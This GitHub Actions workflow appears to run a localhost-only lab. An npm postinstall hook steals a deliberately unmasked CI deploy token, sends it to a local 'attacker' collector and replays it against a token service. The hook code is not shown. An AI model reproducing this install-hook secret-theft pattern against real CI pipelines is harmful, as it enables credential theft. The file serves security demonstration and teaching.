name: npm-build
on: [push, workflow_dispatch]

# Least-privilege token: the job only needs to read the checked-out code.
permissions:
  contents: read

jobs:
  build:
    # GitHub-hosted clean VM. Free + unlimited on a public repo.
    # The entire attack chain runs inside this VM — nothing leaves it, and no
    # real-world credential is ever involved. The "credential" is a live but
    # lab-only JWT minted by deploy-api, valid for 15 minutes, signed with a
    # secret generated at container start that exists only in this job.
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      # The whole attack chain runs in ONE shell so the background lab services
      # (deploy-api, attacker listener) are guaranteed alive when the beacon
      # fires — no reliance on a detached process surviving between steps.
      - name: Run supply-chain attack chain
        env:
          LAB_HOST: "127.0.0.1"   # package beacon targets the local collector
          LAB_PORT: "4444"
        run: |
          set -euo pipefail

          # Everything is co-located on this one runner, so talk to localhost
          # directly. listener.py's replay target is set via DEPLOY_API below —
          # no /etc/hosts hacks, portable across act and GitHub-hosted.
          export DEPLOY_API="http://127.0.0.1:9000"

          cleanup() { kill "${DPID:-}" "${APID:-}" 2>/dev/null || true; }
          trap cleanup EXIT

          # 1. real HS256 token service
          python deploy-api/app.py >deploy-api.log 2>&1 &
          DPID=$!
          for i in $(seq 1 20); do
            curl -sf http://127.0.0.1:9000/health >/dev/null && break
            sleep 1
            [ "$i" = 20 ] && { echo "deploy-api never came up"; cat deploy-api.log; exit 1; }
          done
          echo "[ok] deploy-api up"

          # 2. attacker collector + replay (inherits DEPLOY_API from the env)
          python attacker/listener.py >attacker.log 2>&1 &
          APID=$!
          for i in $(seq 1 10); do
            (echo >/dev/tcp/127.0.0.1/4444) 2>/dev/null && break
            sleep 1
          done
          echo "[ok] collector listening"

          # 3. CI fetches a live deploy credential (OIDC/secrets-store handoff)
          TOK="$(curl -s http://127.0.0.1:9000/token | python -c 'import sys,json; print(json.load(sys.stdin)["token"])')"
          export CI_DEPLOY_TOKEN="$TOK"   # not masked on purpose — showing it leak is the point
          echo "[ci] CI_DEPLOY_TOKEN set (live signed deploy JWT, ${#TOK} chars)"

          # 4. compromised install fires the beacon, stealing the token
          ( cd victim-app && npm install )   # <-- postinstall hook runs here
          sleep 3                            # let the collector receive + replay

          echo '==================== ATTACKER COLLECTOR LOG ===================='
          cat attacker.log
          echo '================================================================'

          # green check == proof of impact: stolen live token was accepted
          grep -q "Stolen credential accepted" attacker.log \
            && echo "PROOF: stolen live token accepted by deploy-api (HTTP 200)." \
            || { echo "attack did not complete as expected"; exit 1; }

      - name: Upload attack log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: attacker-log
          path: attacker.log
          if-no-files-found: warn

      - name: App runs fine (victim notices nothing)
        working-directory: victim-app
        run: |
          node -e "console.log('app output: build complete')"

      - name: Tear down lab services
        if: always()
        run: |
          kill "$DEPLOY_API_PID" "$ATTACKER_PID" 2>/dev/null || true
